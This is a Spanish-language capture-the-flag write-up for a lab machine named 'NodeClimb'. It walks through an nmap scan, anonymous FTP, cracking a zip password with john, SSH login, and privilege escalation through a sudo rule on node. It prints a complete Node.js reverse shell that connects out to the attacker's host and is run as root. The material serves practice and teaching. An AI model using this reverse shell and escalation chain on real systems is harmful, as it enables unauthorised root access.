# MÁQUINA NODECLIMB

Lo pirmero que tednremos que hacer será escanear los puertos que se encuentran abiertos dentro de la máquina con el comando nmap:

```shell
nmap -p- -sS -sC -sV -vvv --min-rate 5000 -Pn 172.17.0.2
```

![NMAP](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto.jpg)

Vemos que tenemos tanto el puerto 21 como el 22 abierto. En el puerto 21 podemos acceder con el usuario Anonymous sin contraseña y vemos que hay un zip que parece interesante, así que vamos a descargarlo en nuestra máquina atacante:

```shell
ftp anonymous@172.17.0.2
```

![FTP](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto2.jpg)

Si intentamos descomprimir el zip vemos que nos pide una contraseña, la cuál no sabemos (aún jeje). Podemos utilizar la herramienta zip2john para obtener un hash:

```shell
zip2john secretitopicaron.zip > hash
```

![ZIP](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto3.jpg)

Una vez tenemos el hash podemos obtener la contraseña usando john:

```shell
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![JOHN](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto4.jpg)

Ahora que ya tenemos la contraseña podemos descomprimir el zip, y vemos que contiene un usuario llamado mario y su contraseña:

![PASSWD](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto5.jpg)

Por lo que vamos a conectarnos por SSH a la máquina:

![SSH](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto6.jpg)

Una vez dentro de la máquina si hacemos un ls vemos que tenemos un script, el cuál esta vacío:

![SCRIPT](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto7.jpg)

Si ejecutamos el comando sudo -l vemos que podemos ejecutar node como root acompañado del script que hemos visto antes. Así que vamos a intentar obtener una reverse shell como root gracias a ese script, para ello nos iremos a la página de RevShells y ahí seleccionaremos la opción de node.js #2 y pondremos nuestros datos:

![SUDO](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto8.jpg)

https://www.revshells.com/

```shell
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("sh", []);
    var client = new net.Socket();
    client.connect(443, "172.17.0.1", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```
Y una vez guardado el script, nos ponemos en escucha y ejecutamos de la manera que nos dice el sudo -l:

```shell
sudo /usr/bin/node /home/mario/script.js
```

![ROOT](https://github.com/Isma-yo/photos/blob/main/NodeClimb/foto9.jpg)

Y ya somos root!!








